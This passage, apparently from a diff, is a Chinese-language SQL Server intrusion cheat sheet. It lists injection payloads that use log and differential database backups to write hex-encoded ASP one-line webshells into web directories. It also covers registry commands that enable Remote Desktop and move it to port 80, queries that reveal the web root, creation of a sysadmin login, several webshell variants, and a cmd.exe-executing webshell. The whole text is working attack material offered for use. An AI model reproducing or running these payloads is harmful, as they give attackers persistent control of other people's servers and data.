+;drop/**/table/**/[itpro]--
+
+第四步
+;create/**/table/**/[itpro]([a]/**/image)--
+
+第五步
+;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[li-168]/**/to/**/disk=@d/**/with/**/init--
+
+第六步
+;insert/**/into/**/[itpro]([a])/**/values(0x3C25657865637574652872657175657374282261222929253EDA)--
+
+第七步
+;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x65003A005C007700650062005C007A002E00610073007000/**/backup/**/log/**/[li-168]/**/to/**/disk=@d/**/with/**/init--
+
+第八步
+;drop/**/table/**/[itpro]--
+
+第九步
+;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[li-168]/**/to/**/disk=@d/**/with/**/init--
+
+      其中红色的“li-168”既是数据库名，这个要根据自己的情况来修改，然后黄色的“0x3C25657865637574652872657175657374282261222929253EDA”是一句话“<%eval request("a")%>”的内容，橙色的“0x65003A005C007700650062005C007A002E00610073007000”为备份的路径“e:\web\z.asp”，都是使用的SQL_En的格式，另外第三步大可以不需要！他是删除itpro的表，如果第一次的话这个表是不存在的，就会提示无权限的信息。另外在语句“disk=@d”的地方可以将“=”更换成“%3D”，就是使用URL编码。“/**/”就等于空格了，这个大家在学习注入的过程中应该了解，也可以更换成“”。
+
+
+
+
+手工备份：  
+第一步：;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x686F6E676C6F757379 backup database @a to disk=@s-- 
+          declare 定议 @a 变量
+第二步：;Drop table [honglousy];create table [dbo].[honglousy] ([cmd] [image])--  删表，建表
+
+第三步：;insert into honglousy(cmd) values(0x3C256578656375746528726571756573742822636D64222929253E)--     <%execute(request("cmd"))%> 一句话森木马：
+             ';' 附近有语法错误。 实际上是成攻的
+
+第四步：;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x643A5CB0A2C0ADB6A1D7A8BCD2C8C8C2F4D4B4B3CCD0F25C5765616C7468547261696E5C676F2E617370 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--
+
+第五步：;Drop table [honglousy]-- 
+
+
+DOS下开3389 并修改端口号
+sc config termservice start= auto
+
+net start termservice
+
+//允许外连
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f 
+
+//该3389端口到80
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 80 /f 
+查3389端口：
+REG query HKLMSYSTEMCurrentControlSetControlTerminal" "ServerWinStationsRDP-Tcp /v PortNumber
+
+
+暴网站目录
+create table labeng(lala nvarchar(255), id int)
+
+DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',@result output insert into labeng(lala) values(@result);
+
+ and  1=(select top 1 lala  from  labeng) 或者 and  1=(select count(*)  from  labeng where lala>1)
+
+
+;declare @d int //是否支持多行
+
+ and  1=(Select count(*)  from  master.dbo.sysobjects Where xtype = 'X'  and  name = 'xp_cmdshell') //判断XP_CMDSHELL是否存在
+
+ and  1=(select count(*)  from  master.dbo.sysobjects where name= 'xp_regread') //查看XP_regread扩展存储过程是不是已经被删除
+
+添加和删除一个SA权限的用户test：（需要SA权限）
+exec master.dbo.sp_addlogin test,p as sword
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+
+
+另一种LOG备份
+;alter datab as e XXXX set RECOVERY FULL--
+;create table [dbo].[shit_tmp] ([cmd] [image])--
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x7900690061006F006C007500 backup log @a to disk = @s with init,no_truncate--
+;insert into [shit_tmp](cmd) values(0x3C25657865637574652872657175657374282276616C7565222929253E)--     //values('<%execute(request("value"))%>') 
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x65003A005C0061006C006C005F0068006F006D0065005C00790065006C006C006F0077005F0068006F006D0065005C007200690035002E00610073007000 backup log @a to [email=disk=@s]disk=@s[/email] with init,no_truncate--     [url=]//@s=e:\all_home\yellow_home\ri5.asp[/url]
+;Drop table [shit_tmp]--
+88、一句话马的几种写法
+a).<%%25Execute(request("a"))%%25>
+b).<%Execute(request("a"))%>
+c).%><%execute request("a")%><%
+d).<script language=VBScript runat=server>execute request("a")</script>
+e).<%25Execute(request("a"))%25>
+89、另两种差异备份
+(1)
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x77006F006B0061006F002E00620061006B00 backup datab as e @a to [email=disk=@s]disk=@s[/email]--
+;create table [dbo].[xiaolu] ([cmd] [image])--
+;insert into xiaolu(cmd) values(0x3C25657865637574652872657175657374282261222929253E)--
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000 backup datab as e @a to [email=disk=@s]disk=@s[/email] WITH DIFFERENTIAL,FORMAT--
+(2)
+;backup datab as e 库名 to disk = 'c:\ddd.bak'--
+;create table [dbo].[dtest] ([cmd] [image])--
+;insert into dtest(cmd) values (0x3C25657865637574652872657175657374282261222929253E)--
+;backup datab as e 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT--
+90、不需要FSO的WEBSHELL
+<%=server.createobject("wscript.shell").exec("cmd.exe /c "request("c")).stdout.readall%>
+十六进制为： 0x3C253D7365727665722E6372656174656F626A6563742822777363726970742E7368656C6C22292E657865632822636D642E657865202F63202226726571756573742822632229292E7374646F75742E72656164616C6C253E
